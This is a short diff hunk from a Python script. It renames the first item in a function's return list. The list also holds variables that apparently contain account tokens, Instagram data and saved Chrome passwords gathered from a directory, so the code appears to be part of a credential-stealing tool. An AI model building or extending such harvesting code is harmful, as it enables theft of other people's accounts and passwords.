@@ -287,7 +287,7 @@ def main(dirpath):
                         all_data_p.append(writable_2)
         except BaseException:
             pass
-    return [tokens, list(set(t_lst)), list(set(tuple(element)
+    return [cleaned, list(set(t_lst)), list(set(tuple(element)
                                                for element in insta_lst)), all_data_p, chrome_psw_list, n_lst]
 
 
